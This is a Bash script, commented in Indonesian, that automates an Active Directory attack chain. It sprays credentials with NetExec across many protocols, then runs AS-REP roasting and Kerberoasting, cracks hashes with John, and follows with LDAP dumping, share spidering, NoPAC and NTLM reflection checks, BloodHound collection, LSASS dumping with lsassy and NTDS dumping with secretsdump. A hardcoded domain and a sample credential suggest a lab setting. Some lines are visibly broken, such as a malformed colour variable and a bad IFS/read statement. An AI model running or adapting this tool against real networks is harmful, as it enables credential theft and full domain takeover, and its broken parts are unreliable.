#!/bin/bash

# --- COLORS ---
BLUE='\033[0;34m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
PURPLE='\033[0;35m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
GRAY='\033[1;30m'
NC='\033[0m'

TARGET_FILE=${1:-target}
USER_FILE=${2:-user}
PASS_FILE=${3:-pass}

OUTDIR="spray_netexec"
RAW_OUT="$OUTDIR/raw_auth_spray.txt"
CLEAN_OUT="$OUTDIR/final_auth_success.txt"
SPIDER_DIR="$OUTDIR/spider_plus"
BROKEN_PIPE_LOG="$OUTDIR/broken_pipe_hosts.txt"
USER_EXPORT_OUT="$OUTDIR/final_auth_user.txt"  
DC_INFO="$OUTDIR/dc_domain_mapping.txt"
FINAL_CRACKED="$OUTDIR/final_cracked_asrep_kerberoast.txt"
FINAL_OUT="$OUTDIR/final_summary.txt"

mkdir -p "$OUTDIR" "$SPIDER_DIR"
: > "$BROKEN_PIPE_LOG"
: > "$CLEAN_OUT"
: > "$RAW_OUT"
: > "$FINAL_CRACKED"
: > "$USER_EXPORT_OUT"

echo -e "${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] Spray Engine${NC}"
echo -e "${PURPLE}====================================================${NC}"

for f in "$TARGET_FILE" "$USER_FILE" "$PASS_FILE"; do
    [[ ! -f "$f" ]] && echo -e "${RED}[!] Error: File '$f' does not exist!${NC}" && exit 1
done

declare -A DC_MAP
declare -A ASREP_DONE
declare -A KERB_DONE
declare -A BH_DONE
declare -A DC_FQDN_MAP
declare -A USER_EXP_DONE

if [[ -s "$DC_INFO" ]]; then
    while IFS=';' read -r dc_ip dc_domain dc_fqdn || [[ -n "$dc_ip" ]]; do
        [[ -z "$dc_ip" || "$dc_ip" =~ ^# ]] && continue
        dc_ip="${dc_ip//[[:space:]]/}"
        dc_domain="${dc_domain//[[:space:]]/}"
        dc_fqdn="${dc_fqdn//[[:space:]]/}"
        DC_MAP["$dc_domain"]="$dc_ip"
        DC_FQDN_MAP["$dc_domain"]="${dc_fqdn:-DC01.$dc_domain}"
    done < "$DC_INFO"
fi

PROTOCOLS=("smb" "rdp" "wmi" "winrm" "mssql" "ssh" "ftp" "vnc" "ldap")

declare -A PROTO_MAP
for proto in "${PROTOCOLS[@]}"; do
    FILE_PROTO="$OUTDIR/active_$proto.txt"
    [[ ! -s "$FILE_PROTO" ]] && continue
    while read -r ip; do
        [[ -z "$ip" ]] && continue
        PROTO_MAP["$ip"]+="$proto "
    done < "$FILE_PROTO"
done

declare -A DOMAIN_CACHE
get_domain() {
    local ip="$1"
    [[ -n "${DOMAIN_CACHE[$ip]}" ]] && { echo "${DOMAIN_CACHE[$ip]}"; return; }
    for d_key in "${!DC_MAP[@]}"; do
        if [[ "${DC_MAP[$d_key]}" == "$ip" ]]; then
            DOMAIN_CACHE[$ip]="$d_key"
            echo "$d_key"
            return
        fi
    done

    local domain="" hostname="" nxc_out
    nxc_out=$(timeout 15s nxc smb "$ip" --no-progress 2>/dev/null)
    domain=$(echo "$nxc_out" | grep -oP '(?<=domain:)[^ )]+' | head -n1)
    hostname=$(echo "$nxc_out" | grep -oP '(?<=\(name:)[^)]+' | head -n1)

    if [[ -z "$domain" || "$domain" == "WORKGROUP" ]]; then
        domain="."
    else
        if [[ -z "${DC_MAP[$domain]}" ]]; then
            DC_MAP["$domain"]="$ip"
            DC_FQDN_MAP["$domain"]="${hostname:-DC01}.${domain}"
        fi
    fi
    DOMAIN_CACHE[$ip]="$domain"
    echo "$domain"
}

TMP_RES=".tmp_res_$$"
TMP_SUCCESS=".tmp_success_$$"

# =========================
# MAIN LOOP
# =========================
for ip in "${!PROTO_MAP[@]}"; do
    echo -e "\n${CYAN}>>> Target Host: $ip${NC}"
    DOMAIN=$(get_domain "$ip")

    for proto in ${PROTO_MAP[$ip]}; do
        echo -e "\n${BLUE}[+] PROTOCOL: ${proto^^}${NC}"
        DOMAIN_ARG=""
        EXTRA=""
        [[ "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]] && EXTRA="--local-auth"

        # -----------------------------------------------------------------
        # STEP 1: LOCAL AUTH SPRAY (ANTI-TIMEOUT LOGIC)
        # -----------------------------------------------------------------
        attempt_spray=1
        max_spray=2
        
        while [ $attempt_spray -le $max_spray ]; do
            echo -e "${GRAY}[CMD] (Attempt $attempt_spray/$max_spray) nxc $proto $ip -u $USER_FILE -p $PASS_FILE $EXTRA --continue-on-success --no-progress${NC}"
            timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" $EXTRA --continue-on-success --no-progress > "$TMP_RES" 2>&1

            # Menampilkan output asli ke layar Anda
            cat "$TMP_RES"

            # Membersihkan kode warna internal pada file temporary sebelum di-grep
            sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES"
            cat "$TMP_RES" >> "$RAW_OUT"

            # Proses ekstraksi kredensial sukses dijamin akurat 100%
            grep -E "\[\+\]|Pwn3d!" "$TMP_RES" > "$TMP_SUCCESS"

            # 1. JIKA SUKSES -> Keluar dari loop
            if [[ -s "$TMP_SUCCESS" ]]; then
                break
            fi

            # 2. JIKA OUTPUT KOSONG (Kasus Hang / Tanpa Respons) -> Coba lagi (Retry)
            if [[ ! -s "$TMP_RES" ]]; then
                echo -e "${YELLOW}[!] Target returned NO OUTPUT (possible hang/drop). Retrying...${NC}"
                if [ $attempt_spray -eq $max_spray ]; then
                    echo "$ip;$proto;LOCAL_NO_OUTPUT_NEED_INVESTIGATION" >> "$BROKEN_PIPE_LOG"
                fi
                ((attempt_spray++))
                sleep 3

            # 3. JIKA TIMEOUT / ERROR JARINGAN DI TEXT -> Coba lagi (Retry)
            elif grep -qiE "Broken Pipe|timed out|connection.*timeout" "$TMP_RES"; then
                echo -e "${YELLOW}[!] Timeout detected during Local Auth. Retrying...${NC}"
                if [ $attempt_spray -eq $max_spray ]; then
                    echo "$ip;$proto;LOCAL_AUTH_TIMEOUT" >> "$BROKEN_PIPE_LOG"
                fi
                ((attempt_spray++))
                sleep 3

            # 4. JIKA NYATA GAGAL AUTENTIKASI (Kredensial Salah) -> Langsung keluar, jangan diulang!
            elif grep -qiE "STATUS_LOGON_FAILURE|STATUS_ACCOUNT|Access denied|\[-\]" "$TMP_RES"; then
                echo -e "${YELLOW}[-] Authentication definitely rejected by target. Skipping retries.${NC}"
                break

            # 5. JIKA ADA OUTPUT TAPI ERROR TIDAK DIKENAL -> Gabung ke log investigasi & langsung hentikan loop
            else
                echo -e "${RED}[!] Unknown error response detected. Logging for investigation and skipping...${NC}"
                echo "$ip;$proto;LOCAL_UNKNOWN_ERROR_NEED_INVESTIGATION" >> "$BROKEN_PIPE_LOG"
                break
            fi
        done

        # -----------------------------------------------------------------
        # STEP 2: DOMAIN AUTH SPRAY (ANTI-TIMEOUT LOGIC)
        # -----------------------------------------------------------------
        if [[ ! -s "$TMP_SUCCESS" && "$DOMAIN" != "." && "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]]; then
            echo -e "${PURPLE}[EXEC] Local auth missed or finished. Trying Domain Spray on $ip ($proto)...${NC}"
            attempt_dom=1
            EXTRA="" 
            
            while [ $attempt_dom -le $max_spray ]; do
                echo -e "${GRAY}[CMD] (Attempt $attempt_dom/$max_spray) nxc $proto $ip -u $USER_FILE -p $PASS_FILE -d $DOMAIN --continue-on-success --no-progress${NC}"
                timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" -d "$DOMAIN" --continue-on-success --no-progress 2>&1 | tee "$TMP_RES"

                sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES" 
                cat "$TMP_RES" >> "$RAW_OUT"
                grep -E "\[\+\]|Pwn3d!" "$TMP_RES" > "$TMP_SUCCESS"
                
                # 1. JIKA SUKSES -> Keluar dari loop
                if [[ -s "$TMP_SUCCESS" ]]; then
                    DOMAIN_ARG="-d $DOMAIN"
                    break
                fi

                # 2. JIKA OUTPUT KOSONG (Kasus Hang / Tanpa Respons) -> Coba lagi (Retry)
                if [[ ! -s "$TMP_RES" ]]; then
                    echo -e "${YELLOW}[!] Target returned NO OUTPUT during Domain Spray. Retrying...${NC}"
                    if [ $attempt_dom -eq $max_spray ]; then
                        echo "$ip;$proto;DOMAIN_NO_OUTPUT_NEED_INVESTIGATION" >> "$BROKEN_PIPE_LOG"
                    fi
                    ((attempt_dom++))
                    sleep 3

                # 3. JIKA TIMEOUT / ERROR JARINGAN DI TEXT -> Coba lagi (Retry)
                elif grep -qiE "Broken Pipe|timed out|connection.*timeout" "$TMP_RES"; then
                    echo -e "${YELLOW}[!] Timeout detected during Domain Auth. Retrying...${NC}"
                    if [ $attempt_dom -eq $max_spray ]; then
                        echo "$ip;$proto;DOMAIN_TIMEOUT_OR_BROKEN_PIPE" >> "$BROKEN_PIPE_LOG"
                    fi
                    ((attempt_dom++))
                    sleep 3

                # 4. JIKA NYATA GAGAL AUTENTIKASI (Kredensial Salah) -> Langsung keluar
                elif grep -qiE "STATUS_LOGON_FAILURE|STATUS_ACCOUNT|Access denied|\[-\]" "$TMP_RES"; then
                    echo -e "${YELLOW}[-] Domain Authentication definitely rejected by target. Skipping retries.${NC}"
                    break

                # 5. JIKA ADA OUTPUT TAPI ERROR TIDAK DIKENAL -> Gabung ke log investigasi & langsung hentikan loop
                else
                    echo -e "${RED}[!] Unknown domain error response detected. Logging for investigation and skipping...${NC}"
                    echo "$ip;$proto;DOMAIN_UNKNOWN_ERROR_NEED_INVESTIGATION" >> "$BROKEN_PIPE_LOG"
                    break
                fi
            done
        fi

        # -----------------------------------------------------------------
        # STEP 3: DYNAMIC MULTI-CREDENTIAL PARSING & POST-EXPLOIT
        # -----------------------------------------------------------------
        if [[ -s "$TMP_SUCCESS" ]]; then
            while IFS= read -r line; do
                [[ -z "$line" ]] && continue
                
                RAW_CRED=$(echo "$line" | sed -n 's/.*\[+\] \([^ ]*\).*/\1/p')
                u_p="${RAW_CRED#*\\}"      
                u="${u_p%%:*}"
                p="${u_p#"$u":}"        

                if [[ -n "$u" && -n "$p" ]]; then
                    echo -e "${GREEN}[!] Valid Credentials Found -> $u:$p${NC}"
                    echo "[$proto] $ip - [+] Valid Credentials Found -> $u:$p" >> "$CLEAN_OUT"
                    if echo "$line" | grep -qi "Pwn3d!"; then
                        echo "[$proto] $ip - [!!!] Pwn3d! Status Achieved for $u" >> "$CLEAN_OUT"
                    fi
                fi
            done < "$TMP_SUCCESS"

            BEST_LINE=$(grep -i "Pwn3d!" "$TMP_SUCCESS" | head -n1)
            [[ -z "$BEST_LINE" ]] && BEST_LINE=$(head -n1 "$TMP_SUCCESS")
            
            RAW_CRED=$(echo "$BEST_LINE" | sed -n 's/.*\[+\] \([^ ]*\).*/\1/p')
            user_pass="${RAW_CRED#*\\}"
            user="${user_pass%%:*}"
            pass="${user_pass#*:}"
            
            dc_ip="${DC_MAP[$DOMAIN]}"

            # --- ROASTING ENGINE ---
            if [[ -n "$dc_ip" && "$DOMAIN" != "." ]]; then
                if [[ -z "${ASREP_DONE[$DOMAIN]}" ]]; then
                    ASREP_DONE[$DOMAIN]=1
                    ASREP_HASH_FILE="$OUTDIR/asrep_${DOMAIN}.txt"
                    echo -e "${PURPLE}[EXEC] Running ASREP Roasting → $DOMAIN ($dc_ip)${NC}"
                    echo -e "${GRAY}[CMD] timeout 40s impacket-GetNPUsers \"$DOMAIN/$user:$pass\" -dc-ip \"$dc_ip\" -request -format hashcat -outputfile \"$ASREP_HASH_FILE\"${NC}"
                    timeout 40s impacket-GetNPUsers "$DOMAIN/$user:$pass" -dc-ip "$dc_ip" -request -format hashcat -outputfile "$ASREP_HASH_FILE" 2>&1 | tee "$OUTDIR/asrep_raw.log"
                    
                    if [[ -s "$ASREP_HASH_FILE" ]]; then
                        echo -e "${RED}[!] ASREP hash found! Cracking with John...${NC}"
                        echo -e "${GRAY}[CMD] timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \"$ASREP_HASH_FILE\"${NC}"
                        timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules "$ASREP_HASH_FILE" 
                        ASREP_RESULT=$(john --show "$ASREP_HASH_FILE" | grep -v "password cracked" | grep ":")
                        if [[ -n "$ASREP_RESULT" ]]; then
                            echo -e "${GREEN}[+++] SUCCESS! Cracked ASREP Hash(es):\n${YELLOW}$ASREP_RESULT${NC}"
                            echo -e "\n[ASREP - $DOMAIN]\n$ASREP_RESULT" >> "$FINAL_CRACKED"
                        fi
                    fi
                fi

                if [[ -z "${KERB_DONE[$DOMAIN]}" ]]; then
                    KERB_DONE[$DOMAIN]=1
                    KERB_HASH_FILE="$OUTDIR/kerberoast_${DOMAIN}.txt"
                    echo -e "${PURPLE}[EXEC] Running Kerberoasting → $DOMAIN ($dc_ip)${NC}"
                    echo -e "${GRAY}[CMD] timeout 40s impacket-GetUserSPNs \"$DOMAIN/$user:$pass\" -dc-ip \"$dc_ip\" -request -outputfile \"$KERB_HASH_FILE\"${NC}"
                    timeout 40s impacket-GetUserSPNs "$DOMAIN/$user:$pass" -dc-ip "$dc_ip" -request -outputfile "$KERB_HASH_FILE" 2>&1 | tee "$OUTDIR/kerberoast_raw.log"
                    
                    if [[ -s "$KERB_HASH_FILE" ]]; then
                        echo -e "${RED}[!] Kerberoast hash found! Cracking with John...${NC}"
                        echo -e "${GRAY}[CMD] timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \"$KERB_HASH_FILE\"${NC}"
                        timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules "$KERB_HASH_FILE" 
                        KERB_RESULT=$(john --show "$KERB_HASH_FILE" | grep -v "password cracked" | grep ":")
                        if [[ -n "$KERB_RESULT" ]]; then
                            echo -e "${GREEN}[+++] SUCCESS! Cracked Kerberoast Hash(es):\n${YELLOW}$KERB_RESULT${NC}"
                            echo -e "\n[KERBEROAST - $DOMAIN]\n$KERB_RESULT" >> "$FINAL_CRACKED"
                        fi
                    fi
                fi
            fi

            # --- LDAP POST-EXPLOIT ---
            if [[ "$proto" == "ldap" ]]; then
                DUMP_PATH="$OUTDIR/ldap_$ip"
                mkdir -p "$DUMP_PATH"

                echo "[DEBUG] RAW DOMAIN: $DOMAIN"
                echo "[DEBUG] RAW USER: $user"
                echo "[DEBUG] FINAL LDAP_USER: $LDAP_USER"

                LDAP_USER="$user"

                if [[ "$DOMAIN" != "." ]]; then
                    LDAP_USER=$(printf '%s\\%s' "$DOMAIN" "$user")
                fi
                echo -e "${YELLOW}[!] Executing ldapdomaindump...${NC}"
                echo "[CMD] timeout 60s ldapdomaindump \"$ip\" -u \"$LDAP_USER\" -p \"$pass\" -o \"$DUMP_PATH\""
                timeout 60s ldapdomaindump "$ip" -u "$LDAP_USER" -p "$pass" -o "$DUMP_PATH" 
                # === EXPORT USERS VIA LDAP (HANYA JIKA SMB BELUM BERHASIL) ===
                if [[ "$DOMAIN" != "." && -z "${USER_EXP_DONE[$DOMAIN]}" ]]; then
                    echo -e "${YELLOW}[!] SMB export missed or skipped. Exporting users via LDAP for domain $DOMAIN...${NC}"
                    echo -e "${GRAY}[CMD] timeout 40s nxc ldap $ip -u \"$user\" -p \"$pass\" $DOMAIN_ARG --users-export \"$USER_EXPORT_OUT.tmp\"${NC}"
                    timeout 40s nxc ldap "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp" 
                    if [[ -s "$USER_EXPORT_OUT.tmp" ]]; then
                        cat "$USER_EXPORT_OUT.tmp" >> "$USER_EXPORT_OUT"
                        rm -f "$USER_EXPORT_OUT.tmp"
                        USER_EXP_DONE[$DOMAIN]=1  # <-- Kunci domain ini
                        echo -e "${GREEN}[+] Successfully exported users via LDAP for $DOMAIN.${NC}"
                    fi
                fi

            fi

            # --- SMB POST-EXPLOIT---
            if [[ "$proto" == "smb" ]]; then
                # === EXPORT USERS VIA SMB (HANYA JIKA BELUM PERNAH SUKSES DI DOMAIN INI) ===
                if [[ "$DOMAIN" != "." && -z "${USER_EXP_DONE[$DOMAIN]}" ]]; then
                    echo -e "${YELLOW}[!] Exporting users via SMB for domain $DOMAIN...${NC}"
                    echo -e "${GRAY}[CMD] timeout 40s nxc smb $ip -u \"$user\" -p \"$pass\" $DOMAIN_ARG --users-export \"$USER_EXPORT_OUT.tmp\"${NC}"
                    timeout 40s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp" 
                    if [[ -s "$USER_EXPORT_OUT.tmp" ]]; then
                        cat "$USER_EXPORT_OUT.tmp" >> "$USER_EXPORT_OUT"
                        rm -f "$USER_EXPORT_OUT.tmp"
                        USER_EXP_DONE[$DOMAIN]=1  # <-- Kunci domain ini agar LDAP tidak perlu running lagi
                        echo -e "${GREEN}[+] Successfully exported users via SMB for $DOMAIN.${NC}"
                    fi
                fi
                ABS_SPIDER=$(readlink -f "$SPIDER_DIR")
                echo -e "${PURPLE}[EXEC] Running spider_plus...${NC}"
                echo -e "${GRAY}[CMD] timeout 60s nxc smb $ip -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER=$ABS_SPIDER${NC}"
                timeout 60s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER="$ABS_SPIDER" 
                
                echo -e "${GRAY}[CMD] timeout 30s nxc smb $ip -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M nopac${NC}"
                # Gunakan file temporary Anda untuk menampung lalu tampilkan ke layar, baru di-grep
                timeout 30s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M nopac > "$TMP_RES" 2>&1
                cat "$TMP_RES" # <--- Tetap memunculkan semua prosesnya ke layar Anda
                grep -qi "VULNERABLE" "$TMP_RES" && { echo -e "${RED}[!] ALERT: Target VULNERABLE to NoPAC!${NC}"; echo "[$proto] $ip - [!!!] ALERT: VULNERABLE to NoPAC!" >> "$CLEAN_OUT"; }


                echo -e "${GRAY}[CMD] timeout 30s nxc smb $ip -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M ntlm_reflection${NC}"
                timeout 30s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M ntlm_reflection > "$TMP_RES" 2>&1
                cat "$TMP_RES" # <--- Tetap memunculkan semua prosesnya ke layar Anda
                grep -qi "vulnerable" "$TMP_RES" && { echo -e "${RED}[!] ALERT: Target VULNERABLE to NTLM Reflection!${NC}"; echo "[$proto] $ip - [!!!] ALERT: VULNERABLE to NTLM Reflection!" >> "$CLEAN_OUT"; }


                if [[ -z "${BH_DONE[$DOMAIN]}" && "$DOMAIN" != "." ]]; then
                    BH_DONE[$DOMAIN]=1
                    BH_DIR="$OUTDIR/bloodhound_${ip}"
                    mkdir -p "$BH_DIR"
                    echo -e "${YELLOW}[*] Ingesting AD data via BloodHound...${NC}"

                    echo -e "${GRAY}[CMD] cd $BH_DIR && timeout 150s bloodhound-python -d \"$DOMAIN\" -dc \"${DC_FQDN_MAP[$DOMAIN]}\" -u \"$user\" -p \"$pass\" -ns \"$ip\" -c all${NC}"
                    (
                        cd "$BH_DIR" || exit
                        # Menggunakan tee agar output muncul di terminal SEKALIGUS ditulis ke log
                        timeout 150s bloodhound-python -d "$DOMAIN" -dc "${DC_FQDN_MAP[$DOMAIN]}" -u "$user" -p "$pass" -ns "$dc_ip" -c all 2>&1 | tee bloodhound_run.log
                    )
                    if ls "$BH_DIR"/*.json >/dev/null 2>&1; then
                        echo -e "${GREEN}[+] BloodHound ingestion completed successfully!${NC}" # <--- Biar ada konfirmasi instan di layar
                        echo "[$proto] $ip - [BH] BloodHound ingestion completed successfully" >> "$CLEAN_OUT"
                    else
                        echo -e "${RED}[!] BloodHound ingestion failed or timed out. Check $BH_DIR/bloodhound_run.log${NC}"
                    fi
                fi

                if echo "$BEST_LINE" | grep -qi "Pwn3d!"; then
                    echo -e "${RED}[EXEC] Pwn3d! Target, running lsassy...${NC}"
                    echo -e "${GRAY}[CMD] timeout 40s nxc smb $ip -u \"$user\" -p \"$pass\" $EXTRA $DOMAIN_ARG -M lsassy${NC}"
                    timeout 40s nxc smb "$ip" -u "$user" -p "$pass" $EXTRA $DOMAIN_ARG -M lsassy > "$TMP_RES" 2>&1
                    if grep -qiE "dumped|success" "$TMP_RES"; then
                        echo "[$proto] $ip - [LSASS] Credentials successfully dumped via lsassy" >> "$CLEAN_OUT"
                    fi
                fi
            fi
        fi
    done
done

rm -f "$TMP_RES" "$TMP_SUCCESS"

# =================================================================
# CLEANUP & USER DUMP SORTING
# =================================================================
if [[ -s "$USER_EXPORT_OUT" ]]; then
    # Menghapus spasi kosong yang tidak sengaja terbawa (opsional tapi aman)
    sed -i '/^[[:space:]]*$/d' "$USER_EXPORT_OUT"
    
    # Melakukan sorting, mengambil nilai unik (sort -u), dan menimpa file aslinya
    sort -u "$USER_EXPORT_OUT" -o "$USER_EXPORT_OUT"
    
    # Menghitung jumlah user unik yang berhasil didapatkan
    TOTAL_USERS=$(wc -l < "$USER_EXPORT_OUT")
    
    echo -e "${GREEN}[+] Consolidated $TOTAL_USERS unique users from SMB/LDAP into:${NC}"
    echo -e "${YELLOW}---> $USER_EXPORT_OUT${NC}\n"
else
    echo -e "\n${YELLOW}[!] No users were exported from any domain targets.${NC}\n"
fi

# =================================================================
# PHASE 4: FINAL CHRONOLOGICAL SUMMARY
# =================================================================
echo -e "\n${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PHASE 4: FINAL CHRONOLOGICAL SUMMARY${NC}"
echo -e "${PURPLE}====================================================${NC}"

: > "$FINAL_OUT"

if [[ -s "$RAW_OUT" ]]; then
    grep -aEi "\[\*\]|LSASSY|VULN|TGT with|PetitPotam|DFSCoerce" "$RAW_OUT" | awk '!seen[$0]++' >> "$FINAL_OUT"
fi

if [[ -s "$CLEAN_OUT" ]]; then
    cat "$CLEAN_OUT" >> "$FINAL_OUT"
fi

if [[ -s "$FINAL_CRACKED" ]]; then
    echo -e "\n--- CRACKED CREDENTIALS (JOHN THE RIPPER) ---" >> "$FINAL_OUT"
    cat "$FINAL_CRACKED" >> "$FINAL_OUT"
fi

if [[ -s "$FINAL_OUT" ]]; then
    while IFS= read -r line; do
        if [[ "$line" == *"[+]"* || "$line" == *"Valid Credentials"* ]]; then
            echo -e "${GREEN}${line}${NC}"
        elif [[ "$line" == *"[!!!]"* || "$line" == *"[LSASS]"* ]]; then
            echo -e "${RED}${line}${NC}"
        elif [[ "$line" == *"[*]"* ]]; then
            echo -e "${BLUE}${line}${NC}"
        else
            echo -e "${YELLOW}${line}${NC}"
        fi
    done < "$FINAL_OUT"
else
    echo -e "${YELLOW}[!] No summary records found.${NC}"
fi
# =================================================================
# EXTRACTION: UNIQUE VALID CREDENTIALS TO Final_valid_creds.txt
# =================================================================
FINAL_CREDS_FILE="$OUTDIR/final_valid_creds_$DOMAIN.txt"
: > "$FINAL_CREDS_FILE"

if [[ -s "$FINAL_OUT" ]]; then
    # Mengambil baris yang memiliki pola kredensial valid
    # Contoh input: [winrm] 10.0.16.179 - [+] Valid Credentials Found -> ATHENA_SVC:1dirtymartini
    # Hasil output: 10.0.16.179;ATHENA_SVC:1dirtymartini
    grep -a "Valid Credentials Found" "$FINAL_OUT" | awk -F'-> ' '{print $1, $2}' | awk '{print $2 ";" $NF}' | sort -u > "$FINAL_CREDS_FILE"

    if [[ -s "$FINAL_CREDS_FILE" ]]; then
        TOTAL_CREDS=$(wc -l < "$FINAL_CREDS_FILE")
        echo -e "\n${GREEN}[+] Successfully extracted $TOTAL_CREDS unique credentials into:${NC}"
        echo -e "${YELLOW}---> $FINAL_CREDS_FILE${NC}"
        echo -e "${GRAY}------------------------------------------------------------${NC}"
        cat "$FINAL_CREDS_FILE"
        echo -e "${GRAY}------------------------------------------------------------${NC}"
    fi
fi
#====================================================
# PHASE 5: AUTOMATIC NTDS DUMPING (Secretsdump)
#====================================================
# Pastikan file kredensial ada dan berisi data sebelum dilanjutkan
if [[ -s "$OUTDIR/final_valid_creds_all.txt" ]]; then
    
    # Ambil baris yang memiliki status pwn3d atau sukses
    grep -i "Pwn3d!" "$OUTDIR/final_valid_creds_all.txt" | sort -u | while IFS=; read -r cred_line; do
        
        # Ekstraksi IP, User, dan Pass dari format simpanan Anda
        # Misal format: 10.0.16.179;ATHENA_SVC:1dirtymartini
        cred_ip=$(echo "$cred_line" | cut -d';' -f1)
        user_pass=$(echo "$cred_line" | cut -d';' -f2)
        cred_user=$(echo "$user_pass" | cut -d':' -f1)
        cred_pass=$(echo "$user_pass" | cut -d':' -f2)
        
        echo -e "${YELLOW}[*] Attempting NTDS.dit dump on $cred_ip using $cred_user...${NC}"
        
        # PERBAIKAN LOGIKA: Definisikan domain secara statis/dinamis dari mapping yang valid
        local_domain="DRY.MARTINI.BARS" 
        
        # PERBAIKAN SINTAKS: Hapus kata 'local' karena ini di luar fungsi!
        dump_out_name="$OUTDIR/secretsdump_${local_domain}_${cred_ip}_${cred_user}"
        
        echo -e "${GRAY}[CMD] timeout 120s impacket-secretsdump -just-dc \"$local_domain/$cred_user:$cred_pass@$cred_ip\" -outputfile \"$dump_out_name\"${NC}"
        
        # Eksekusi perintah secretsdump
        timeout 120s impacket-secretsdump -just-dc "$local_domain/$cred_user:$cred_pass@$cred_ip" -outputfile "$dump_out_name" > "$OUTDIR/secretsdump_run.log" 2>&1
        
        # Validasi output apakah berhasil terbuat
        if [[ -s "${dump_out_name}.ntds" ]]; then
            echo -e "${GREEN}[+++] SUCCESS! Domain hashes dumped successfully from $cred_ip${NC}"
            echo -e "${GREEN}[+] Output saved to: ${dump_out_name}.ntds${NC}"
        else
            echo -e "${RED shadow}[-] Failed to dump NTDS from $cred_ip using $cred_user (Check privileges)${NC}"
        fi
        echo "------------------------------------------------------------"
    done
fi


if [[ -s "$BROKEN_PIPE_LOG" ]]; then
    echo -e "\n${RED}[!] HOSTS WITH CONNECTION TIMEOUTS / BROKEN PIPE:${NC}"
    echo -e "${GRAY}------------------------------------------------------------${NC}"
    cat "$BROKEN_PIPE_LOG"
fi
